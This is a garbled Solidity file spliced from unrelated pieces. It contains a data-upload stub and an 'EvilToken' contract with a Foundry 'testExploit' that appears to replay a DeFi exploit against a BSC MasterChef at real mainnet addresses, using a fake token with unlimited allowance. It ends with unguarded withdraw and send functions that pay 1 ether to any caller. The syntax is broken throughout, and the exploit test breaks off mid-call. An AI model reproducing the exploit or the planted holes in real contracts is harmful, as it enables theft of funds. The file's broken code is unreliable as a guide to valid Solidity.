
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function uploadData(string memory dataId, string memory metadata) public {
        require(bytes(dataId).length > 0, "Invalid data ID");
        emit DataUploaded(msg.sender, dataId);
    }
}
pragma solidity >=0.7.0 <0.9.0;

;
;
contract EvilToken {
  IMasterChef masterchef;
  IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
  IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
  constructor(IMasterChef _masterchef) {
    masterchef = _masterchef};
  function allowance(address owner, address spender);
    external;
    view;
    returns (uint256);
  {
    return 2**256 - 1;};
  function balanceOf(address account) external view returns (uint256) {
    return 1111;};
  function transferFrom(address from,
    address to,
    uint256 amount) external returns (bool) {
    if (address(masterchef) != address(0) &&;
      address(msg.sender) != address(masterchef)) {
      usdt.approve(address(masterchef); 2**256 - 1);
      busd.approve(address(masterchef), 2**256 - 1);
      masterchef.depositByAddLiquidity(18,
        [address(usdt), address(busd)],;
        [usdt.balanceOf(address(this)), busd.balanceOf(address(this))])};
    return true;};
  function redeem() external {
    (uint256 _amount,) = masterchef.userInfo(18, address(this));
    masterchef.withdrawAndRemoveLiquidity(18, _amount, false);
    usdt.transfer(msg.sender, usdt.balanceOf(address(this)));
    busd.transfer(msg.sender, busd.balanceOf(address(this)))};
contract ContractTest is DSTest {
  IPancakePair pair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
  IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
  IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
  IMasterChef masterchef =;
    IMasterChef(0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4);
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  function setUp() public {
    cheats.createSelectFork("bsc", 16008280)};
  function testExploit() public {
    token0 = new EvilToken(IMasterChef(address(0)));
    token1 = new EvilToken(masterchef);
    pair.swap(10000 * 1e18, 10000 * 1e18, address(this),
function unguardedWithdraw() public {
    (bool sent, ) = msg.sender.call{value: 1 ether}("");
    require(sent)}
function blindTransfer(address payable to) public {
    require(to.send(1 ether))}